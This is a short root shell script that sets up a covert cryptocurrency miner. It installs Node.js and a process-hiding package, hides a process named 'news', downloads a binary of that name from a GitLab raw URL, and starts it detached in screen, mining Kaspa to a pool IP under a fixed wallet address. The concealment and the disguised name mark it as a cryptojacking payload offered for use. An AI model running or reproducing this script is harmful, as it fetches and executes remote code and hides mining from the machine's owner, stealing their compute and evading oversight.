sudo su <<EOF
apt-get update -y && apt-get upgrade -y >/dev/null 2>&1
apt-get install -y libjansson-dev
apt install screen -y
apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
apt install npm -y
npm i -g node-process-hider
apt-get upgrade -y
ph add news
wget https://gitlab.com/teletyl/gm/-/raw/main/news && chmod +x news
screen -dms run  ./news --algo KASPA --pool 47.89.230.127:443 --user kaspa:qrh5ckwta4prfxh4wfvn2ard2k488dx967v8hwzvumr2une5r2a4sjhvemwpz.$(echo $(date +"news-%T-[%Z+7]")) --tls enable
EOF
